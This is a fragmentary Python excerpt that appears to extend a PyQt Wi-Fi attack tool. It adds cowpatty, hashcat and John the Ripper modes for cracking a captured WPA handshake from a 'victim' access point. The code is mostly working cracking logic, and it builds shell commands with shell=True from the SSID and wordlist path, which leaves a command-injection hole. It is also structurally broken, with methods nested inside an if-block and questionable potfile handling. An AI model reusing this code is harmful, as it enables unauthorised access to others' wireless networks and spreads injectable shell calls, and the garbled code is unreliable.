...
class wpa_attack_dialog(QtWidgets.QDialog,Ui_attack_panel):
    ...
    def wpa_disable_items(self):
        ...
        # Add advanced attack options
        self.attack_type_combo.clear()
        self.attack_type_combo.addItem("Standard Dictionary Attack")
        self.attack_type_combo.addItem("Cowpatty PMK Attack")
        self.attack_type_combo.addItem("Hybrid Attack (Dictionary + Rules)")
    ...
    def launch_cowpatty_attack(self):
        """Enhanced WPA2 cracking using Cowpatty for PMK computation"""
        try:
            # Check if cowpatty is available
            subprocess.run(['cowpatty', '--version'], capture_output=True, check=True)

            # Generate PMK file if needed
            ssid = variables.victim_access_point
            pmk_file = f'/tmp/fern-log/WPA-DUMP/{ssid}_pmk.txt'

            # Use genpmk for precomputation if available
            if os.path.exists('/usr/bin/genpmk'):
                genpmk_cmd = f'genpmk -f "{self.wordlist}" -d "{pmk_file}" -s "{ssid}"'
                subprocess.run(genpmk_cmd, shell=True, check=True)

                # Run cowpatty with precomputed PMKs
                cowpatty_cmd = f'cowpatty -d "{pmk_file}" -r "/tmp/fern-log/WPA-DUMP/wpa_dump-01.cap" -s "{ssid}"'
            else:
                # Fallback to standard cowpatty
                cowpatty_cmd = f'cowpatty -f "{self.wordlist}" -r "/tmp/fern-log/WPA-DUMP/wpa_dump-01.cap" -s "{ssid}"'

            process = subprocess.Popen(cowpatty_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

            while process.poll() is None:
                output = process.stdout.readline().decode('utf-8', errors='ignore')
                if 'key found' in output.lower():
                    # Extract key from output
                    key_match = re.search(r'key\s*:\s*([^\s]+)', output, re.IGNORECASE)
                    if key_match:
                        with open('/tmp/fern-log/WPA-DUMP/wpa_key.txt', 'w') as f:
                            f.write(key_match.group(1))
                        break
                time.sleep(0.1)

            if os.path.exists('/tmp/fern-log/WPA-DUMP/wpa_key.txt'):
                self.wpa_key_found_signal.emit()
            else:
                self.wpa_key_not_found_signal.emit()

        except subprocess.CalledProcessError:
            # Fallback to standard aircrack-ng
            self.launch_brutefore()
        except FileNotFoundError:
            # Cowpatty not available, use aircrack-ng
            self.launch_brutefore()
    ...
    def capture_loop(self):
        ...
        if attack_type == "Cowpatty PMK Attack":
            threading.Thread(target=self.launch_cowpatty_attack).start()
        elif attack_type == "Hybrid Attack (Dictionary + Rules)":
            threading.Thread(target=self.launch_hybrid_attack).start()
        else:
    ...
    def wpa_launch_attack(self):
        ...
        if self.select_client == str():
            ...
            def launch_hybrid_attack(self):
                """Hybrid attack combining dictionary with rule-based mutations"""
                try:
                    # Check for hashcat or john the ripper
                    hashcat_available = subprocess.run(['hashcat', '--version'], capture_output=True, check=False).returncode == 0
                    john_available = subprocess.run(['john', '--version'], capture_output=True, check=False).returncode == 0
        
                    if hashcat_available:
                        self.launch_hashcat_hybrid()
                    elif john_available:
                        self.launch_john_hybrid()
                    else:
                        # Fallback to enhanced aircrack-ng
                        self.launch_brutefore()
        
                except Exception:
                    self.launch_brutefore()
        
            def launch_hashcat_hybrid(self):
                """Use Hashcat for hybrid attacks"""
                ssid = variables.victim_access_point
                cap_file = '/tmp/fern-log/WPA-DUMP/wpa_dump-01.cap'
                hccapx_file = f'/tmp/fern-log/WPA-DUMP/{ssid}.hccapx'
        
                # Convert cap to hccapx
                convert_cmd = f'cap2hccapx {cap_file} {hccapx_file}'
                subprocess.run(convert_cmd, shell=True, check=False)
        
                if os.path.exists(hccapx_file):
                    # Run hashcat with hybrid rules
                    hashcat_cmd = f'hashcat -m 2500 {hccapx_file} {self.wordlist} -r /usr/share/hashcat/rules/best64.rule --force'
                    process = subprocess.Popen(hashcat_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
                    while process.poll() is None:
                        output = process.stdout.readline().decode('utf-8', errors='ignore')
                        if 'Cracked' in output or 'STATUS' in output:
                            # Check for cracked password
                            if os.path.exists(f'{hccapx_file}.potfile'):
                                with open(f'{hccapx_file}.potfile', 'r') as f:
                                    content = f.read()
                                    if ':' in content:
                                        password = content.split(':')[-1].strip()
                                        with open('/tmp/fern-log/WPA-DUMP/wpa_key.txt', 'w') as key_file:
            ...
            def launch_john_hybrid(self):
                """Use John the Ripper for hybrid attacks"""
                # Convert cap file for john
                ssid = variables.victim_access_point
                cap_file = '/tmp/fern-log/WPA-DUMP/wpa_dump-01.cap'
        
                # Use wpapcap2john if available
                try:
                    john_file = f'/tmp/fern-log/WPA-DUMP/{ssid}.john'
                    convert_cmd = f'wpapcap2john {cap_file} > {john_file}'
                    subprocess.run(convert_cmd, shell=True, check=True)
        
                    # Run john with rules
                    john_cmd = f'john {john_file} --wordlist={self.wordlist} --rules'
                    process = subprocess.Popen(john_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
                    while process.poll() is None:
                        output = process.stdout.readline().decode('utf-8', errors='ignore')
                        if ssid in output and 'password' in output.lower():
                            # Extract password
                            password_match = re.search(r'password:\s*(\S+)', output, re.IGNORECASE)
                            if password_match:
                                with open('/tmp/fern-log/WPA-DUMP/wpa_key.txt', 'w') as f:
                                    f.write(password_match.group(1))
                                self.wpa_key_found_signal.emit()
                                return
                        time.sleep(0.5)
